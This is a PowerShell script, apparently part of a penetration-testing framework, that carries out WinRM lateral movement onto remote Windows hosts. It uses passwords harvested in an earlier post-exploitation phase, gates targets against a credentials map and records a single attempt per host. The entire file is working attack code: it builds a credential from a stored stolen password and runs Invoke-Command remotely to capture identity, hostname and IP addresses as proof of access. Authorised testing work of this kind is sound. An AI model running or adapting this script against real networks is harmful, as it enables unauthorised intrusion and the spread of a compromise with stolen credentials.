<#
.SYNOPSIS
  v0507_winrm_lateral.ps1 v2 - WinRM lateral with MAP GATE (T1021.006)
  Consumed by exploit_runner.ps1. Subcommands: validate | execute
  Doctrine: destination must be in credentials_map.json; creds come from the
  phase-08 store (credstore/), never typed; single attempt; NLA check first.
#>
$VectorId  = 'V-05-CREDACCESS-HIVES'
$Technique = 'T1021.006'
$EvidDir   = if ($env:EVID_DIR) { $env:EVID_DIR } else { '.\lat_evidence' }
$Map       = if ($env:MAP)      { $env:MAP } else { '..\08_post_exploitation\evidence\credentials_map.json' }
$CredFile  = if ($env:CRED_FILE) { $env:CRED_FILE } else { '' }   # exported cred (gitignored zone)
$Dest      = if ($env:DEST)      { $env:DEST } else { '' }        # user@host
$State     = Join-Path $EvidDir 'attempted.list'

function Test-MapContains([string]$Host_, [string]$MapPath) {
    if (-not (Test-Path $MapPath)) { return $false }
    $raw = Get-Content $MapPath -Raw
    return ($raw -match ('"host"\s*:\s*"' + [regex]::Escape($Host_) + '"'))
}

switch ($args[0]) {
    'validate' {
        New-Item -ItemType Directory -Force -Path $EvidDir | Out-Null
        $v = Join-Path $EvidDir 'validation.txt'
        if (-not (Test-Path $Map)) { "map=missing" | Out-File $v -Encoding UTF8; exit 2 }
        if ($Dest -notmatch '@') { "dest=invalid_format" | Out-File $v -Append -Encoding UTF8; exit 3 }
        $dhost = ($Dest -split '@')[-1]
        if (-not (Test-MapContains $dhost $Map)) {
            "dest=$dhost in_map=NO -> REFUSED (chain: phase-08 contract)" |
                Out-File $v -Append -Encoding UTF8
            exit 2
        }
        "dest=$dhost in_map=YES" | Out-File $v -Append -Encoding UTF8
        if (-not ($CredFile -and (Test-Path $CredFile))) {
            "cred=unreadable (export via phase-08 store; never typed)" |
                Out-File $v -Append -Encoding UTF8
            exit 3
        }
        "gate=passed" | Out-File $v -Append -Encoding UTF8
        exit 0
    }
    'execute' {
        New-Item -ItemType Directory -Force -Path $EvidDir | Out-Null
        $dhost = ($Dest -split '@')[-1]
        # re-run gate (defense in depth)
        if (-not (Test-MapContains $dhost $Map)) {
            @{ outcome = 'refused_unmapped'; dest = $dhost } |
                ConvertTo-Json | Out-File (Join-Path $EvidDir 'outcome.json') -Encoding UTF8
            exit 2
        }
        # retry ceiling ledger
        if ((Test-Path $State) -and ((Get-Content $State) -contains $Dest)) {
            @{ outcome = 'refused_retry_no_justification'; dest = $Dest } |
                ConvertTo-Json | Out-File (Join-Path $EvidDir 'outcome.json') -Encoding UTF8
            exit 2
        }

        $user = ($Dest -split '@')[0]
        $pass = (Get-Content $CredFile -Raw).Trim()   # from 08 store; never typed
        $sec  = ConvertTo-SecureString $pass -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential($user, $sec)

        $proof = Join-Path $EvidDir 'execution_proof.txt'
        "### lateral proof ts=$([DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ssZ')) vector=$VectorId dest=$Dest method=winrm" |
            Out-File $proof -Encoding UTF8
        try {
            # NLA/negotiate, single bounded invocation:
            $r = Invoke-Command -ComputerName $dhost -Credential $cred `
                    -Authentication Negotiate -ErrorAction Stop `
                    -ScriptBlock { "remote_identity:"; whoami; hostname; (Get-NetIPAddress -AddressFamily IPv4 |
                        Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' }).IPAddress }
            $r | Out-File $proof -Append -Encoding UTF8
        } catch {
            $_ | Out-String | Out-File $proof -Append -Encoding UTF8
        }
        Add-Content -Path $State -Value $Dest   # attempt ledger

        if ((Get-Content $proof -Raw) -match 'remote_identity:' -and (Get-Content $proof -Raw) -match '\\') {
            @{ outcome = 'context_obtained'; destination = $Dest; method = 'winrm' } |
                ConvertTo-Json | Out-File (Join-Path $EvidDir 'outcome.json') -Encoding UTF8
            exit 0
        }
        @{ outcome = 'execution_failed'; destination = $Dest } |
            ConvertTo-Json | Out-File (Join-Path $EvidDir 'outcome.json') -Encoding UTF8
        exit 4
    }
    default { exit 2 }
}
